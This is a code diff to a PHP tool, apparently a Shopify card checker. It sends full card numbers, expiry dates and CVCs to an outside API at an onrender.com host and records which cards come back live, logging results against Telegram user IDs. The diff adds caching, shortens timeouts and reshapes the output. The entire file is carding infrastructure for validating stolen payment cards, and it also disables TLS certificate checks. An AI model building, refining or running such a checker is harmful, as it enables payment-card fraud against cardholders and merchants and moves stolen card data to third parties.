@@ -27,9 +27,7 @@ $_ENV = [];
 if (file_exists($envFile)) {
     $lines = file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
     foreach ($lines as $line) {
-        if (strpos(trim($line), '#') === 0 || !strpos($line, '=')) {
-            continue;
-        }
+        if (strpos(trim($line), '#') === 0 || !strpos($line, '=')) continue;
         list($key, $value) = explode('=', $line, 2);
         $_ENV[trim($key)] = trim($value);
     }
@@ -56,13 +54,24 @@ try {
     }
 } catch (Exception $e) {
     log_message("Database connection failed in autoshopify.php: " . $e->getMessage());
-    $pdo = null; // Continue without DB
+    $pdo = null;
 }
 
-// Function to check a single card on a single site with retry
+// In-memory cache for API responses
+static $response_cache = [];
+
+// Function to check a single card on a single site
 function checkCard($site, $card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
-    global $pdo;
+    global $pdo, $response_cache;
     $card_details = "$card_number|$exp_month|$exp_year|$cvc";
+    $cache_key = md5("$card_details|$site");
+
+    // Check cache first
+    if (isset($response_cache[$cache_key])) {
+        log_message("Cache hit for $card_details on $site");
+        return $response_cache[$cache_key];
+    }
+
     $encoded_cc = urlencode($card_details);
     $api_url = "https://rocks-mbs7.onrender.com/index.php?site=$site&cc=$encoded_cc";
     log_message("Checking card: $card_details on site: $site, URL: $api_url");
@@ -71,7 +80,7 @@ function checkCard($site, $card_number, $exp_month, $exp_year, $cvc, $retry = 1)
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $api_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Reduced timeout
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production
 
@@ -87,16 +96,17 @@ function checkCard($site, $card_number, $exp_month, $exp_year, $cvc, $retry = 1)
         if ($response === false || $http_code !== 200 || !empty($curl_error)) {
             if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $attempt < $retry) {
                 log_message("Timeout for $card_details on $site, retrying...");
-                usleep(500000); // 0.5s delay before retry
+                usleep(300000); // Reduced to 0.3s delay
                 continue;
             }
             log_message("Failed for $card_details on $site: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
             $result = [
                 'status' => 'DECLINED',
-                'message' => "API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno)",
-                'card_details' => $card_details
+                'message' => "API request failed: $curl_error (HTTP $http_code)",
+                'card' => $card_details,
+                'site' => $site
             ];
-            // Store result in database if available
+            $response_cache[$cache_key] = $result;
             if ($pdo) {
                 try {
                     $stmt = $pdo->prepare("
@@ -125,9 +135,10 @@ function checkCard($site, $card_number, $exp_month, $exp_year, $cvc, $retry = 1)
             $result = [
                 'status' => 'DECLINED',
                 'message' => "Invalid API response: " . substr($response, 0, 100),
-                'card_details' => $card_details
+                'card' => $card_details,
+                'site' => $site
             ];
-            // Store result in database if available
+            $response_cache[$cache_key] = $result;
             if ($pdo) {
                 try {
                     $stmt = $pdo->prepare("
@@ -168,10 +179,11 @@ function checkCard($site, $card_number, $exp_month, $exp_year, $cvc, $retry = 1)
         $result = [
             'status' => $status,
             'message' => $response_msg,
-            'card_details' => $card_details
+            'card' => $card_details,
+            'site' => $site
         ];
+        $response_cache[$cache_key] = $result;
 
-        // Store result in database if available
         if ($pdo) {
             try {
                 $stmt = $pdo->prepare("
@@ -194,33 +206,6 @@ function checkCard($site, $card_number, $exp_month, $exp_year, $cvc, $retry = 1)
         log_message("$status for $card_details on $site: $response_msg");
         return $result;
     }
-
-    log_message("Failed after retries for $card_details on $site");
-    $result = [
-        'status' => 'DECLINED',
-        'message' => 'API request failed after retries',
-        'card_details' => $card_details
-    ];
-    // Store result in database if available
-    if ($pdo) {
-        try {
-            $stmt = $pdo->prepare("
-                INSERT INTO results (telegram_id, card_number, status, response, gateway, checked_at)
-                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
-            ");
-            $stmt->execute([
-                $_SESSION['user']['telegram_id'],
-                $card_details,
-                $result['status'],
-                $result['message'],
-                'autoshopify'
-            ]);
-            log_message("Stored result for $card_details in database");
-        } catch (Exception $e) {
-            log_message("Failed to store result for $card_details: " . $e->getMessage());
-        }
-    }
-    return $result;
 }
 
 // Check if the request is POST and contains card and site data
@@ -308,11 +293,11 @@ if (!filter_var($site, FILTER_VALIDATE_URL)) {
 // Process card with the specified site
 $result = checkCard($site, $card_number, $exp_month, $exp_year, $cvc);
 
-// Format response to match index.php expectations
+// Format response to match client-side expectations
 echo json_encode([
     'status' => $result['status'],
-    'message' => "[{$result['message']}]",
-    'card' => $result['card_details'],
-    'site' => $site
+    'message' => $result['message'],
+    'card' => $result['card'],
+    'site' => $result['site']
 ]);
 ?>
